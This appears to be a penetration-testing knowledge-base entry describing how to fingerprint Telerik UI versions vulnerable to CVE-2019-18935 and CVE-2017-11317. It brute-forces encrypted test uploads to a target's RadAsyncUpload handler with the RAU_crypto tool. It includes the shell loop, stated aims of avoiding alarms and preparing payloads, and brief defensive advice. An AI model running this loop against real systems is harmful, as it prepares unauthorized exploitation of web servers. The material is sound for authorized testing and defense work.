---
tags:
  - version-enumeration
  - bruteforce
  - telerik
type: procedure
tools:
  - '[[tools/RAU_crypto]]'
  - '[[tools/python3]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/echo-create-testfile]]'
  - '[[commands/for-loop-bruteforce-versions]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Gather Victim Host Information]]'
updated_at: '2025-12-14T17:23:37.463Z'
sub_techniques: []
id: 97a0c869-de26-4e03-a493-f37f83ee3de7
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Gather Victim Host Information]]'
---
# Identify Vulnerable Telerik Version

## Summary

This procedure brute-forces known vulnerable Telerik UI versions by attempting encrypted file uploads using the RAU_crypto tool, identifying the exact version affected by CVE-2019-18935 or CVE-2017-11317.

## Description

Vulnerable Telerik versions use weak encryption in the RadAsyncUpload handler, allowing version-specific payloads. By testing uploads against a list of versions (e.g., from versions.txt), the procedure detects success via fileInfo responses, enabling targeted exploitation. It requires the handler to be registered and uses a benign test file to avoid detection.

## Requirements

1. List of vulnerable versions in versions.txt
2. [[tools/RAU_crypto]] cloned and installed
3. [[tools/python3]] with dependencies
4. Test file and target URL

## Defense

Defensive measures and detection strategies:

- Upgrade to patched Telerik versions
- Enable strong encryption keys for handlers
- Log and alert on repeated .axd upload attempts
- Use endpoint protection to block Python-based traffic patterns

## Objectives

1. Pinpoint the Telerik UI version for exploit customization
2. Confirm upload capability without triggering alarms
3. Prepare for payload crafting

## Instructions

### Step 1: Create Test File

**Context**: Generate a simple file for upload testing to verify encryption bypass per version.

**Command** ([[commands/echo-create-testfile]]):
```bash
echo 'test' > testfile.txt
```

> Redirects 'test' to testfile.txt. Success: File created with content 'test'.

### Step 2: Brute-Force Versions with Upload Attempts

**Context**: Loop through versions, encrypt and upload the test file, filtering for successful fileInfo to identify the match.

**Command** ([[commands/for-loop-bruteforce-versions]]):
```bash
for VERSION in $(cat versions.txt); do echo -n "$VERSION: "; python3 RAU_crypto.py -P 'password' "$VERSION" testfile.txt https://target.com/app/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo; done
```

> Tests each version; suppresses errors and echoes empty on failure. Success: Version with JSON fileInfo indicating upload worked.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Gather Victim Host Information]] Gather Victim Host Information

### Sub-Techniques

- [[Client Configurations]] Client Configurations

## Commands Used

- [[commands/echo-create-testfile]]
- [[commands/for-loop-bruteforce-versions]]

## Tools Used

- [[tools/RAU_crypto]]
- [[tools/python3]]

## Tags

- [[version-enumeration]]
- [[bruteforce]]
- [[telerik]]
